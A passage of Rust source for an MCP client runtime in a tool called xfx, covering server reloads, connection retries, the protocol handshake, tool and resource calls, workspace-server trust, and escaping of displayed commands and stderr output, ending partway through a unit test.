                    _ => origin,
                });
                return;
            }
            state.reloading = true;
        }
        self.say(Event::Changed);
        let mut origin = origin;
        loop {
            self.reload_once(origin);
            let mut state = self.state();
            match state.again.take() {
                Some(next) if !self.closed.load(Ordering::Acquire) => origin = next,
                _ => {
                    state.reloading = false;
                    break;
                }
            }
        }
        self.say(Event::Changed);
    }

    fn reload_once(self: &Arc<Self>, origin: Origin) {
        let (configs, issues, choices, digests) = match self.read_configuration() {
            Ok(read) => read,
            Err(_) => {
                // The one thing a reload says (`collectMcpHostFacts`,
                // `vercel-labs/fx@481104fd src/core/app/app_commands.zig:
                // 340-345`). A profile the session could not read at its
                // start keeps the sentence it had: which file problems stop
                // a load, and what is said of them, is the config's
                // (`src/mcp/config.rs`).
                self.notice(
                    true,
                    if origin == Origin::Startup {
                        "MCP configuration could not be reloaded. Your existing MCP servers are still active. Check the configuration and run /mcp list for details before trying again."
                    } else {
                        "The MCP config changed, but xfx couldn't load it again. Your current servers are still active."
                    },
                );
                return;
            }
        };
        self.mark_started();
        // In place: a server whose configuration is the same keeps running as
        // it is, whatever its state -- fx's engine keeps every slot whose
        // config is the same (`Engine.reload`, `src/mcp/engine.zig:167-186`)
        // -- and the rest start fresh.
        let current = self.servers();
        let index = by_name(&digests);
        let mut next: Vec<Arc<Server>> = Vec::with_capacity(configs.len());
        let mut connecting: Vec<Arc<Server>> = Vec::new();
        for config in configs {
            let kept = current
                .iter()
                .find(|server| server.config == config && !server.stopped.load(Ordering::Acquire));
            let server = match kept {
                Some(server) => Arc::clone(server),
                None => Server::new(config, &index),
            };
            if server.should_connect() && !server.claimed.swap(true, Ordering::AcqRel) {
                connecting.push(Arc::clone(&server));
            }
            next.push(server);
        }
        let retired: Vec<Arc<Server>> = {
            let mut state = self.state();
            let old = std::mem::replace(&mut state.servers, next.clone());
            state.issues = issues;
            state.choices = choices;
            state.digests = digests;
            old.into_iter()
                .filter(|server| !next.iter().any(|kept| Arc::ptr_eq(kept, server)))
                .collect()
        };
        // A changed server's old process goes before its new one starts
        // (`Runtime.reload`, `runtime.zig:628-642`; `Engine.stopping`,
        // `src/mcp/engine.zig:194-199`): each stop returns once nothing it
        // started runs, a try in its handshake included ([`Server::stop`]).
        for server in retired {
            server.stop();
        }
        self.generation.fetch_add(1, Ordering::AcqRel);
        self.say(Event::Changed);
        // None once the session is ending: what it stops is what is in force.
        if self.closed.load(Ordering::Acquire) {
            return;
        }
        // Each on a thread of its own, tried until it is up or out of tries;
        // nobody waits for them.
        for server in connecting {
            let runtime = Arc::clone(self);
            let spawned = std::thread::Builder::new()
                .name("xfx-mcp-connect".into())
                .spawn({
                    let server = Arc::clone(&server);
                    move || runtime.connect(&server)
                });
            if spawned.is_err() {
                let mut live = server.live();
                live.connection = Connection::Failed;
                live.failure = Some("xfx couldn't start a thread for it".to_string());
            }
        }
    }

    /// Connects `server`: tried until it is up, it is stopped, or its tries
    /// run out ([`Retry`]). Between tries it is `Retrying`, with why the last
    /// one failed.
    fn connect(&self, server: &Arc<Server>) {
        let retry = self.retry();
        let mut tries = 0u8;
        loop {
            if server.stopped.load(Ordering::Acquire) {
                return;
            }
            tries = tries.saturating_add(1);
            server.live().connection = Connection::Connecting;
            let failed = match self.open(server) {
                Ok(()) => return,
                Err(_) if server.stopped.load(Ordering::Acquire) => return,
                Err(failed) => failed,
            };
            let auth = failed.error == McpError::Named("McpAuthenticationRequired");
            let mut live = server.live();
            live.needs_auth = auth;
            live.failure = Some(failed.words);
            if !worth_retrying(&failed.error) || tries >= retry.attempts {
                live.connection = Connection::Failed;
                return;
            }
            live.connection = Connection::Retrying;
            drop(live);
            if !server.pause(retry.backoff(tries)) {
                return;
            }
        }
    }

    /// One attempt: start, initialize, list the tools, publish. A failure
    /// comes with fx's words for it ([`failure_words`]).
    ///
    /// The connection is the server's from the moment it is started
    /// ([`Server::hand_over`]), so a stop during the handshake closes it; and
    /// it is published under the same lock a stop takes, so a stopped server
    /// never gets one. A stopped server's try ends `Ok`, with nothing to say.
    fn open(&self, server: &Arc<Server>) -> Result<(), Box<Failed>> {
        let Some(_opening) = Opening::begin(server) else {
            return Ok(());
        };
        let config = &server.config;
        let deadline = Instant::now() + config.startup_timeout();
        let left = || deadline.saturating_duration_since(Instant::now());
        let started = |error: McpError| Box::new(Failed::new(Step::Start, error, None, None));
        let transport: Arc<dyn Transport> = match config.transport {
            Kind::Stdio => Arc::new(
                StdioTransport::spawn(&config.command, &config.args, &config.env, None)
                    .map_err(started)?,
            ),
            Kind::Http => Arc::new(
                HttpTransport::open(
                    &config.url,
                    &http_headers(config, &*self.environment).map_err(started)?,
                )
                .map_err(started)?,
            ),
            Kind::Sse => return Err(started(McpError::Named("McpTransportUnsupported"))),
        };
        #[cfg(all(test, feature = "fault-injection"))]
        self.held(Hold::BeforeHandOver);
        if !server.hand_over(&transport) {
            return Ok(());
        }
        // `_opening` is held to the end of the try, its own teardown
        // included: a stop that finds nothing to close waits for it.
        let result = self.handshake(server, &transport, &left);
        let (version, capabilities, instructions, tools) = match result {
            Ok(found) => found,
            Err((step, error)) => {
                // What a stdio server said on its way out, and how it ended,
                // read while the connection is still the server's: a stop now
                // closes it itself, and these end at once. An HTTP server has
                // neither.
                let (stderr, exit) =
                    if config.transport == Kind::Stdio && !server.stopped.load(Ordering::Acquire) {
                        (transport.diagnostic(), transport.exit())
                    } else {
                        (None, None)
                    };
                // `None`: a stop took it and closed it, and is the reason.
                let mine = server.take_back().is_some();
                #[cfg(all(test, feature = "fault-injection"))]
                if mine {
                    self.held(Hold::BeforeOwnClose);
                }
                transport.close();
                if !mine || server.stopped.load(Ordering::Acquire) {
                    return Ok(());
                }
                return Err(Box::new(Failed::new(step, error, exit, stderr.as_deref())));
            }
        };
        let mut live = server.live();
        if server.stopped.load(Ordering::Acquire) || live.starting.take().is_none() {
            drop(live);
            transport.close();
            return Ok(());
        }
        live.connection = Connection::Ready;
        live.needs_auth = false;
        live.failure = None;
        live.transport = Some(transport);
        live.protocol_version = Some(version);
        live.capabilities = capabilities;
        live.instructions = instructions;
        live.tools = tools;
        live.listed = Listed::default();
        Ok(())
    }

    #[allow(clippy::type_complexity)]
    fn handshake(
        &self,
        server: &Server,
        transport: &Arc<dyn Transport>,
        left: &dyn Fn() -> Duration,
    ) -> Result<(String, Capabilities, Option<String>, Vec<McpTool>), (Step, McpError)> {
        let at = |step: Step| move |error: McpError| (step, error);
        let initialized = transport.request(
            "initialize",
            json!({
                "protocolVersion": REQUESTED_VERSION,
                // No elicitation, sampling or roots: xfx answers none of
                // them, so it advertises none of them.
                "capabilities": {},
                "clientInfo": {"name": "xfx", "version": env!("CARGO_PKG_VERSION")},
            }),
            left(),
            None,
        );
        let initialized = initialized.map_err(at(Step::Initialize))?;
        let version = initialized
            .get("protocolVersion")
            .and_then(Value::as_str)
            .ok_or((
                Step::Initialize,
                McpError::Named("McpUnsupportedProtocolVersion"),
            ))?;
        let accepted: &[&str] = if server.config.transport == Kind::Stdio {
            &STDIO_VERSIONS
        } else {
            &HTTP_VERSIONS
        };
        if !accepted.contains(&version) {
            return Err((
                Step::Initialize,
                McpError::Named("McpUnsupportedProtocolVersion"),
            ));
        }
        let advertised = initialized.get("capabilities").and_then(Value::as_object);
        let has = |key: &str| {
            advertised.is_some_and(|map| map.get(key).is_some_and(|value| !value.is_null()))
        };
        let capabilities = Capabilities {
            tools: has("tools"),
            resources: has("resources"),
            prompts: has("prompts"),
            completions: has("completions"),
        };
        let instructions = initialized
            .get("instructions")
            .and_then(Value::as_str)
            .map(str::to_string);
        transport
            .notify(
                "notifications/initialized",
                (server.config.transport != Kind::Stdio).then(|| json!({})),
            )
            .map_err(at(Step::Initialized))?;
        let mut tools = Vec::new();
        if capabilities.tools {
            let mut cursor: Option<String> = None;
            for _ in 0..MAX_PAGES {
                let params = match &cursor {
                    Some(cursor) => json!({"cursor": cursor}),
                    None => json!({}),
                };
                let page = transport
                    .request("tools/list", params, left(), None)
                    .map_err(at(Step::Tools))?;
                for tool in page
                    .get("tools")
                    .and_then(Value::as_array)
                    .ok_or((Step::Tools, McpError::Named("McpInvalidResult")))?
                {
                    if let Some(tool) = self.tool(&server.config.name, tool) {
                        tools.push(tool);
                    }
                }
                cursor = page
                    .get("nextCursor")
                    .and_then(Value::as_str)
                    .map(str::to_string);
                if cursor.is_none() {
                    break;
                }
            }
        }
        Ok((version.to_string(), capabilities, instructions, tools))
    }

    /// One `tools/list` entry, named for the model.
    fn tool(&self, server: &str, entry: &Value) -> Option<McpTool> {
        let name = entry.get("name")?.as_str()?.to_string();
        let mut schema = entry
            .get("inputSchema")
            .cloned()
            .unwrap_or_else(|| json!({"type": "object"}));
        if !schema.is_object() {
            return None;
        }
        // A model schema is an object schema, as upstream's dynamic tool
        // schema requires one (`dynamicFunctionSchemaJsonAlloc`).
        if schema.get("type").is_none() {
            schema
                .as_object_mut()
                .expect("an object")
                .insert("type".into(), Value::from("object"));
        }
        let alias = self
            .names
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .name(server, &name)?;
        Some(McpTool {
            tags: super::names::tags(server, &name),
            alias,
            title: entry
                .get("title")
                .and_then(Value::as_str)
                .map(str::to_string),
            description: entry
                .get("description")
                .and_then(Value::as_str)
                .unwrap_or_default()
                .to_string(),
            input_schema: schema,
            name,
        })
    }

    // -----------------------------------------------------------------------
    // trust
    // -----------------------------------------------------------------------

    /// Every pending project server the last read found, with the digest of
    /// its entry: what an approve-all binds.
    fn pending_entries(state: &State) -> Vec<(String, String)> {
        state
            .servers
            .iter()
            .filter(|server| server.config.admission == Some(Admission::Pending))
            .filter_map(|server| {
                let entry = server.entry.as_ref()?;
                Some((server.config.name.clone(), entry.digest.clone()))
            })
            .collect()
    }

    /// A trust choice (`applyProjectMcpAction`, `app_commands.zig:1407-1466`):
    /// saved, announced with `body` -- a menu's choice has none, and says
    /// only what warns (`.warnings_only`, `app_mcp_runtime.zig:545-560
    /// @481104fd`) -- and put in force by a reload.
    fn trust(self: &Arc<Self>, action: TrustAction, body: &str) {
        let Some(settings) = self.paths.settings.clone() else {
            self.notice(
                true,
                "Project MCP choices were not applied: SettingsUnavailable.",
            );
            return;
        };
        // What the runtime holds now, from one read of the state.
        let loaded = {
            let state = self.state();
            config::Loaded {
                entries: state.digests.clone(),
                pending: Self::pending_entries(&state),
            }
        };
        match config::save_action(&settings, &self.paths.workspace, &action, &loaded) {
            Ok(_) => {
                if !body.is_empty() {
                    self.notice(false, body);
                }
                self.reload(Origin::Transcript);
            }
            Err(err) => {
                self.notice(
                    true,
                    format!(
                        "Project MCP choices were not applied: {}.",
                        crate::output::safe_one_line(&err.to_string(), 200)
                    ),
                );
            }
        }
    }

    // -----------------------------------------------------------------------
    // what the model sees
    // -----------------------------------------------------------------------

    /// Every ready server's tools.
    pub fn tools(&self) -> Vec<(Arc<Server>, McpTool)> {
        self.servers()
            .into_iter()
            .flat_map(|server| {
                server
                    .tools()
                    .into_iter()
                    .map(move |tool| (Arc::clone(&server), tool))
                    .collect::<Vec<_>>()
            })
            .collect()
    }

    /// The tool the model calls `alias`, with the server it is on.
    pub fn tool_by_alias(&self, alias: &str) -> Option<(Arc<Server>, McpTool)> {
        self.tools()
            .into_iter()
            .find(|(_, tool)| tool.alias == alias)
    }

    /// Calls `alias` with `arguments`, under the server's operation timeout.
    /// A stdio server that has stopped is started again once, inside its
    /// restart limit (`restart_failed_result`, `tool_result.zig:196-215`).
    pub fn call_tool(
        &self,
        alias: &str,
        arguments: Value,
        cancel: Option<&CancelToken>,
    ) -> Result<(Arc<Server>, McpTool, Value), McpError> {
        let (server, tool) = self
            .tool_by_alias(alias)
            .ok_or(McpError::Named("McpToolNotFound"))?;
        let transport = self.transport(&server)?;
        let result = transport.request(
            "tools/call",
            json!({"name": tool.name, "arguments": arguments}),
            server.config.operation_timeout(),
            cancel,
        )?;
        Ok((server, tool, result))
    }

    /// A ready server's connection, started again when it has gone and a
    /// restart is left.
    fn transport(&self, server: &Arc<Server>) -> Result<Arc<dyn Transport>, McpError> {
        // Looked at and, for a restart, counted under one lock: two calls
        // that find it gone spend one restart, and one try runs
        // ([`Opening::begin`]).
        let (transport, restart) = {
            let mut live = server.live();
            let transport = live.transport.clone();
            let restart = transport
                .as_ref()
                .is_some_and(|transport| !transport.alive())
                && server.config.transport == Kind::Stdio
                && live.restarts < server.config.restart_limit;
            if restart {
                live.restarts += 1;
            }
            (transport, restart)
        };
        match transport {
            Some(transport) if transport.alive() => Ok(transport),
            Some(_) if restart => match self.open(server) {
                Ok(()) => server
                    .live()
                    .transport
                    .clone()
                    .ok_or(McpError::Named("McpConnectionClosed")),
                Err(failed) => {
                    let mut live = server.live();
                    live.connection = Connection::Failed;
                    live.failure = Some(failed.words);
                    Err(McpError::Restart(failed.error.to_string()))
                }
            },
            Some(_) => Err(McpError::Restart(
                server
                    .live()
                    .failure
                    .clone()
                    .unwrap_or_else(|| "McpConnectionClosed".to_string()),
            )),
            None => Err(McpError::Named("McpServerUnavailable")),
        }
    }

    // -----------------------------------------------------------------------
    // resources, prompts, completion
    // -----------------------------------------------------------------------

    /// The server a feature operation is about (`awaitFeatureServer`,
    /// `mcp_runtime.zig:131-147`): known, admitted, and done connecting.
    fn feature_server(
        &self,
        name: &str,
        cancel: Option<&CancelToken>,
    ) -> Result<Arc<Server>, McpError> {
        let server = self
            .server(name)
            .ok_or(McpError::Named("McpServerNotFound"))?;
        if server.config.source == Source::Workspace
            && server.config.admission != Some(Admission::Approved)
        {
            return Err(McpError::Named("McpWorkspaceApprovalRequired"));
        }
        let deadline = Instant::now() + server.config.operation_timeout();
        // Still coming up: a try under way, or the wait before the next one.
        while matches!(
            server.live().connection,
            Connection::Connecting | Connection::Retrying
        ) {
            if cancel.is_some_and(CancelToken::is_cancelled) {
                return Err(McpError::Named("Cancelled"));
            }
            if Instant::now() >= deadline {
                return Err(McpError::Named("McpRequestTimedOut"));
            }
            std::thread::sleep(Duration::from_millis(5));
        }
        Ok(server)
    }

    fn feature_request(
        &self,
        server: &Arc<Server>,
        method: &str,
        params: Value,
        cancel: Option<&CancelToken>,
    ) -> Result<Value, McpError> {
        let transport = self.transport(server)?;
        transport.request(method, params, server.config.operation_timeout(), cancel)
    }

    /// Every page of one list method's `key`.
    fn paged(
        &self,
        server: &Arc<Server>,
        method: &str,
        key: &str,
        cancel: Option<&CancelToken>,
    ) -> Result<Vec<Value>, McpError> {
        let mut items = Vec::new();
        let mut cursor: Option<String> = None;
        for _ in 0..MAX_PAGES {
            let params = match &cursor {
                Some(cursor) => json!({"cursor": cursor}),
                None => json!({}),
            };
            let page = self.feature_request(server, method, params, cancel)?;
            items.extend(
                page.get(key)
                    .and_then(Value::as_array)
                    .ok_or(McpError::Named("McpInvalidResult"))?
                    .iter()
                    .cloned(),
            );
            cursor = page
                .get("nextCursor")
                .and_then(Value::as_str)
                .map(str::to_string);
            if cursor.is_none() {
                break;
            }
        }
        Ok(items)
    }

    /// `listResources` (`mcp_runtime.zig:2430-2453`).
    pub fn list_resources(
        &self,
        name: &str,
        templates: bool,
        cancel: Option<&CancelToken>,
    ) -> Result<Vec<Resource>, McpError> {
        let server = self.feature_server(name, cancel)?;
        if !server.live().capabilities.resources {
            return Err(McpError::Named("McpResourcesUnsupported"));
        }
        let (method, key, uri) = if templates {
            (
                "resources/templates/list",
                "resourceTemplates",
                "uriTemplate",
            )
        } else {
            ("resources/list", "resources", "uri")
        };
        let items = self.paged(&server, method, key, cancel)?;
        let resources: Vec<Resource> = items
            .iter()
            .filter_map(|item| {
                Some(Resource {
                    uri: item.get(uri)?.as_str()?.to_string(),
                    name: item
                        .get("name")
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .to_string(),
                    title: item
                        .get("title")
                        .and_then(Value::as_str)
                        .map(str::to_string),
                    description: item
                        .get("description")
                        .and_then(Value::as_str)
                        .map(str::to_string),
                    mime_type: item
                        .get("mimeType")
                        .and_then(Value::as_str)
                        .map(str::to_string),
                    template: templates,
                })
            })
            .collect();
        let mut live = server.live();
        if templates {
            live.listed.templates = Some(resources.len());
        } else {
            live.listed.resources = Some(resources.len());
        }
        Ok(resources)
    }

    /// `readResource`: the `contents` the server returned for `uri`.
    pub fn read_resource(
        &self,
        name: &str,
        uri: &str,
        cancel: Option<&CancelToken>,
    ) -> Result<Vec<Value>, McpError> {
        let server = self.feature_server(name, cancel)?;
        if !server.live().capabilities.resources {
            return Err(McpError::Named("McpResourcesUnsupported"));
        }
        let result =
            self.feature_request(&server, "resources/read", json!({"uri": uri}), cancel)?;
        result
            .get("contents")
            .and_then(Value::as_array)
            .cloned()
            .ok_or(McpError::Named("McpInvalidResult"))
    }

    /// `listPrompts` (`mcp_runtime.zig:2455-2476`).
    pub fn list_prompts(
        &self,
        name: &str,
        cancel: Option<&CancelToken>,
    ) -> Result<Vec<Prompt>, McpError> {
        let server = self.feature_server(name, cancel)?;
        if !server.live().capabilities.prompts {
            return Err(McpError::Named("McpPromptsUnsupported"));
        }
        let items = self.paged(&server, "prompts/list", "prompts", cancel)?;
        let prompts: Vec<Prompt> = items
            .iter()
            .filter_map(|item| {
                Some(Prompt {
                    name: item.get("name")?.as_str()?.to_string(),
                    title: item
                        .get("title")
                        .and_then(Value::as_str)
                        .map(str::to_string),
                    description: item
                        .get("description")
                        .and_then(Value::as_str)
                        .map(str::to_string),
                    arguments: item
                        .get("arguments")
                        .and_then(Value::as_array)
                        .into_iter()
                        .flatten()
                        .filter_map(|argument| {
                            Some(PromptArgument {
                                name: argument.get("name")?.as_str()?.to_string(),
                                required: argument.get("required").and_then(Value::as_bool)
                                    == Some(true),
                                description: argument
                                    .get("description")
                                    .and_then(Value::as_str)
                                    .map(str::to_string),
                            })
                        })
                        .collect(),
                })
            })
            .collect();
        server.live().listed.prompts = Some(prompts.len());
        Ok(prompts)
    }

    /// `getPrompt`: the prompt's description and messages.
    pub fn get_prompt(
        &self,
        name: &str,
        prompt: &str,
        arguments: Map<String, Value>,
        cancel: Option<&CancelToken>,
    ) -> Result<Value, McpError> {
        let server = self.feature_server(name, cancel)?;
        if !server.live().capabilities.prompts {
            return Err(McpError::Named("McpPromptsUnsupported"));
        }
        self.feature_request(
            &server,
            "prompts/get",
            json!({"name": prompt, "arguments": arguments}),
            cancel,
        )
    }

    /// `completion/complete` for a prompt's argument or a template's variable.
    pub fn complete(
        &self,
        name: &str,
        reference: Value,
        argument: &str,
        value: &str,
        context: Map<String, Value>,
        cancel: Option<&CancelToken>,
    ) -> Result<Value, McpError> {
        let server = self.feature_server(name, cancel)?;
        let capabilities = server.live().capabilities;
        let wants_prompts = reference.get("type").and_then(Value::as_str) == Some("ref/prompt");
        if wants_prompts && !capabilities.prompts {
            return Err(McpError::Named("McpPromptsUnsupported"));
        }
        if !wants_prompts && !capabilities.resources {
            return Err(McpError::Named("McpResourcesUnsupported"));
        }
        if !capabilities.completions {
            return Err(McpError::Named("McpCompletionsUnsupported"));
        }
        let mut params = json!({"ref": reference, "argument": {"name": argument, "value": value}});
        if !context.is_empty() {
            params["context"] = json!({"arguments": context});
        }
        let result = self.feature_request(&server, "completion/complete", params, cancel)?;
        result
            .get("completion")
            .cloned()
            .ok_or(McpError::Named("McpInvalidResult"))
    }

    // -----------------------------------------------------------------------
    // the end
    // -----------------------------------------------------------------------

    /// Stops every server. What the session does on its way out.
    pub fn shutdown(&self) {
        self.closed.store(true, Ordering::Release);
        self.jobs
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .take();
        // A reload under way puts its set in force, and stops what it
        // dropped, before the servers in force are stopped; it starts none
        // once `closed` is set.
        let deadline = Instant::now() + STOP_WAIT;
        while Instant::now() < deadline && {
            let state = self.state();
            state.reloading
        } {
            std::thread::sleep(Duration::from_millis(5));
        }
        let servers = std::mem::take(&mut self.state().servers);
        for server in servers {
            server.stop();
        }
    }

    /// The profile file's path, when there is a profile.
    pub fn profile_path(&self) -> Option<&Path> {
        self.paths.profile.as_deref()
    }
}

impl Drop for McpRuntime {
    fn drop(&mut self) {
        self.shutdown();
    }
}

/// The step of a start a failure came at: what says which of fx's words is
/// meant.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Step {
    /// Starting the process, or opening the endpoint.
    Start,
    /// `initialize`, and the version it answered with.
    Initialize,
    /// `notifications/initialized`.
    Initialized,
    /// `tools/list`.
    Tools,
}

/// Whether another try could bring a server up after `error`. A sign-in, a
/// transport xfx does not connect and a variable a header needs that is not
/// set are the person's to change, not time's: fx holds such a server back
/// rather than starting it (`held`, `vercel-labs/fx@481104fd
/// src/core/mcp_host/runtime.zig:1851-1861`), so it is `Failed` at once.
fn worth_retrying(error: &McpError) -> bool {
    !matches!(
        error,
        McpError::Named(
            "McpAuthenticationRequired"
                | "McpTransportUnsupported"
                | "McpHeaderEnvironmentMissing"
                | "McpBearerEnvironmentMissing"
        )
    )
}

/// One failed attempt: the error, for what is decided by it, and how a
/// person is told of it.
#[derive(Debug, Clone, PartialEq)]
struct Failed {
    error: McpError,
    words: String,
}

impl Failed {
    fn new(step: Step, error: McpError, exit: Option<Exit>, stderr: Option<&str>) -> Self {
        let words = failure_words(step, &error, exit, stderr);
        Self { error, words }
    }
}

/// Why a server is down, in fx v0.0.16's words (`writeFailure`,
/// `describeFailure`, `vercel-labs/fx@481104fd
/// src/core/mcp_host/runtime.zig:2277-2308`): the reason, how a stdio
/// server's process ended -- `its process exited with code 3` -- and its last
/// stderr lines ([`stderr_tail`]), quoted:
/// `its process exited with code 3; its last stderr lines: "boom-stderr"`
/// (`fail-server-1`). fx's own name is xfx's here. What xfx has no word of
/// fx's for -- a spawn that failed, a page of tools that could not be read --
/// is its error's name, as fx shows a reason it has no words for as it is.
fn failure_words(step: Step, error: &McpError, exit: Option<Exit>, stderr: Option<&str>) -> String {
    let unsupported = *error == McpError::Named("McpUnsupportedProtocolVersion");
    // A process that is gone is the reason, however the request it was asked
    // saw it go (`.{ "process", "its process exited" }`); its exit then says
    // how, and after any other reason it is added.
    let own = step != Step::Start
        && exit.is_some()
        && !unsupported
        && *error != McpError::Named("McpAuthenticationRequired");
    let mut words = match (step, error) {
        (_, McpError::Named("McpAuthenticationRequired")) => "it needs a login".to_string(),
        _ if own => "its process exited".to_string(),
        (Step::Initialize, _) if unsupported => {
            "it answered with an MCP version xfx doesn't support".to_string()
        }
        (Step::Initialize, _) => {
            "it refused or never answered xfx's initialize request".to_string()
        }
        (Step::Initialized, _) => "it never answered xfx's initialized notification".to_string(),
        (Step::Start | Step::Tools, error) => error.to_string(),
    };
    match exit {
        Some(Exit::Code(code)) => words.push_str(&format!(
            "{} with code {code}",
            if own { "" } else { "; its process exited" }
        )),
        Some(Exit::Signal(signal)) => words.push_str(&format!(
            "{} on signal {signal}",
            if own { "" } else { "; its process exited" }
        )),
        None => {}
    }
    if let Some(tail) = stderr.and_then(stderr_tail) {
        words.push_str(&format!("; its last stderr lines: \"{tail}\""));
    }
    words
}

/// A stdio server's last stderr lines as a failure quotes them
/// (`keepTail`, `stderrTail`, `vercel-labs/fx@481104fd
/// src/mcp/io/process.zig:721-756`): the last three, each without its
/// trailing blanks and cut to 240 bytes, oldest first, joined with ` / `, and
/// the whole cut from the front to 240 bytes -- never inside a character.
/// `None` when it wrote nothing.
///
/// Each line is made inert first by [`super::terminal_safe`]: what a server
/// writes to its standard error is the server's, and reaches the screen only
/// spelled -- a control byte, a line break or a bidirectional override is
/// named rather than obeyed. fx writes such a byte as `?`; xfx spells it,
/// as it does every name a server supplies.
pub(crate) fn stderr_tail(stderr: &str) -> Option<String> {
    let mut lines: Vec<&str> = stderr.split('\n').collect();
    // What follows the last line break is a line only when it holds text.
    if lines.last().is_some_and(|last| last.is_empty()) {
        lines.pop();
    }
    let start = lines.len().saturating_sub(STDERR_TAIL_LINES);
    let kept: Vec<String> = lines[start..]
        .iter()
        .map(|line| {
            let spelled = super::terminal_safe(line.trim_end_matches([' ', '\t', '\r']));
            head_bytes(&spelled, STDERR_TAIL_MAX_BYTES).to_string()
        })
        .collect();
    let joined = kept.join(" / ");
    let tail = tail_bytes(&joined, STDERR_TAIL_MAX_BYTES);
    (!tail.is_empty()).then(|| tail.to_string())
}

/// At most `max` bytes from the start of `text`, never inside a character.
fn head_bytes(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut end = max;
    while !text.is_char_boundary(end) {
        end -= 1;
    }
    &text[..end]
}

/// At most `max` bytes from the end of `text`, never inside a character.
fn tail_bytes(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut start = text.len() - max;
    while !text.is_char_boundary(start) {
        start += 1;
    }
    &text[start..]
}

/// The last read's digests by entry name, for one lookup per server rather
/// than a scan.
fn by_name(digests: &[(String, String)]) -> HashMap<&str, &str> {
    digests
        .iter()
        .map(|(name, digest)| (name.as_str(), digest.as_str()))
        .collect()
}

/// A project server's [`ShownEntry`], when it is one a person is asked
/// about: a workspace entry not approved as it stands, which is never
/// expanded, so its rows are the entry as written.
fn shown_entry(config: &ServerConfig, digests: &HashMap<&str, &str>) -> Option<ShownEntry> {
    if config.source != Source::Workspace || config.admission == Some(Admission::Approved) {
        return None;
    }
    let digest = (*digests.get(config.name.as_str())?).to_string();
    Some(ShownEntry {
        rows: entry_rows(config),
        digest,
    })
}

/// An entry's rows, each whole and spelled by [`prompt_value`]: the
/// command line or the address, then `env: NAME=value` for each variable and
/// `header: Name: value` for each header -- its `headers` as written, a
/// `header_env` header as the `${VAR}` it is sent from, and
/// `bearer_token_env` as the `Authorization` it becomes ([`http_headers`]).
/// One row each, so a value cannot pass for the next entry, and a line break
/// in a name or a value is spelled, not drawn.
pub(crate) fn entry_rows(config: &ServerConfig) -> Vec<String> {
    let mut rows = match config.transport {
        Kind::Stdio => {
            let words: Vec<String> = std::iter::once(&config.command)
                .chain(&config.args)
                .map(|word| shell_word(word))
                .collect();
            vec![format!("command: {}", words.join(" "))]
        }
        Kind::Http | Kind::Sse => vec![format!("url: {}", config.url)],
    };
    rows.extend(
        config
            .env
            .iter()
            .map(|(name, value)| format!("env: {name}={value}")),
    );
    rows.extend(
        config
            .headers
            .iter()
            .map(|(name, value)| format!("header: {name}: {value}")),
    );
    rows.extend(
        config
            .header_env
            .iter()
            .map(|(name, variable)| format!("header: {name}: ${{{variable}}}")),
    );
    rows.extend(
        config
            .bearer_token_env
            .iter()
            .map(|variable| format!("header: Authorization: Bearer ${{{variable}}}")),
    );
    rows.iter().map(|row| prompt_value(row)).collect()
}

/// One value of an entry's rows as the approval view spells a command it
/// asks about ([`crate::tui::approval_view::command_text`]): nothing a
/// terminal would obey, and nothing it would hide or reorder -- a
/// bidirectional override, a zero-width or invisible code point -- left as it
/// is, so a row cannot show a command other than the one that runs. One row:
/// a line break is `\x0a` here, where the approval view keeps it as a row
/// break, so a value cannot draw rows of its own.
#[cfg(unix)]
fn prompt_value(text: &str) -> String {
    crate::tui::approval_view::command_text(&text.replace('\n', "\\x0a"))
}

/// Where there is no TUI to borrow the approval view from, upstream's tokens
/// alone ([`crate::tools::question::terminal_safe`]), which spell the line
/// break too.
#[cfg(not(unix))]
fn prompt_value(text: &str) -> String {
    crate::tools::question::terminal_safe(text).into_owned()
}

/// One word of a command line as a POSIX shell would read it back: bare when
/// nothing in it needs quoting, else single-quoted, else -- when it holds a
/// control character -- ANSI-C quoted with the character spelled out, so the
/// shown word means what the shell would be given.
fn shell_word(word: &str) -> String {
    let bare = |byte: u8| byte.is_ascii_alphanumeric() || b"/._-+=:,@%".contains(&byte);
    if !word.is_empty() && word.bytes().all(bare) {
        return word.to_string();
    }
    if !word.chars().any(char::is_control) {
        return format!("'{}'", word.replace('\'', r"'\''"));
    }
    let mut out = String::from("$'");
    for character in word.chars() {
        match character {
            '\\' => out.push_str(r"\\"),
            '\'' => out.push_str(r"\'"),
            '\n' => out.push_str(r"\n"),
            '\t' => out.push_str(r"\t"),
            '\r' => out.push_str(r"\r"),
            other if other.is_control() => out.push_str(&format!("\\u{:04X}", u32::from(other))),
            other => out.push(other),
        }
    }
    out.push('\'');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// An entry's rows as one text, one row a line: what these cases read.
    fn what_it_runs(config: &ServerConfig) -> String {
        entry_rows(config).join("\n  ")
    }

    #[test]
    fn a_failure_quotes_the_last_three_stderr_lines_joined_and_cut_from_the_front() {
        // `stderrTail`, `vercel-labs/fx@481104fd src/mcp/io/process.zig:737-756`.
        assert_eq!(stderr_tail("boom-stderr\n").as_deref(), Some("boom-stderr"));
        assert_eq!(stderr_tail("a\nb\nc\nd\n").as_deref(), Some("b / c / d"));
        assert_eq!(stderr_tail("a\nb \t\r\nc").as_deref(), Some("a / b / c"));
        assert_eq!(stderr_tail(""), None);
        assert_eq!(stderr_tail("\n"), None);
        // Each line at most 240 bytes from its start, the whole at most 240
        // from its end, never inside a character.
        let long = format!("{}\n{}\n", "a".repeat(300), "\u{e9}".repeat(200));
        let tail = stderr_tail(&long).expect("a tail");
        assert!(tail.len() <= STDERR_TAIL_MAX_BYTES, "{}", tail.len());
        assert!(tail.ends_with('\u{e9}') && !tail.contains('a'), "{tail}");
        // One line with no break: its head, not its tail, is what is kept of
        // it -- the per-line cut is from the start, the whole one from the
        // end, and only these sentinels tell them apart.
        let unterminated = format!("HEAD{}TAIL", "x".repeat(1_000));
        assert_eq!(
            stderr_tail(&unterminated).as_deref(),
            Some(format!("HEAD{}", "x".repeat(236)).as_str())
        );
        let lines = format!(
            "{}\n{}\n{}\n",
            "x".repeat(100),
            "y".repeat(100),
            "z".repeat(100)
        );
        let tail = stderr_tail(&lines).expect("a tail");
        assert_eq!(tail.len(), STDERR_TAIL_MAX_BYTES);
